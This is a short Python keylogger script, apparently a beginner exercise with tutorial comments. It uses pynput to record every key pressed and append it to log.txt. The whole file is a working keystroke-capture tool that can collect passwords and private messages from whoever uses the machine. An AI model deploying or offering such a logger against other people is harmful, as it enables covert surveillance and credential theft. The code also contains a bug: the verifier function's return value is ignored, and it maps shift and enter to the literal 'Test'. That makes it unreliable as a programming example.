from pynput.keyboard import Listener

# it has to stores the keystrokes in a text file
# file handling - read, write and append

# r - reading
# w - writing
# a - appending to a file

# Listeners - Listen to keystrokes


if __name__ == '__main__':

    def write_to_file(key):
        letter = str(key)
        letter = letter.replace("'", "")

        verifier(letter)

        # Closes the file automatically - Release memory
        with open("log.txt", "a") as f:
            f.write(letter)
    
    def verifier(arg):
        if arg == 'Key.space':
            arg = ' '
        
        if arg == 'Key.shift_r':
            arg = 'Test'

        if arg == 'Key.enter':
            arg = 'Test'      
        
        return arg
            
    with Listener(on_press=write_to_file) as listener:
        listener.join()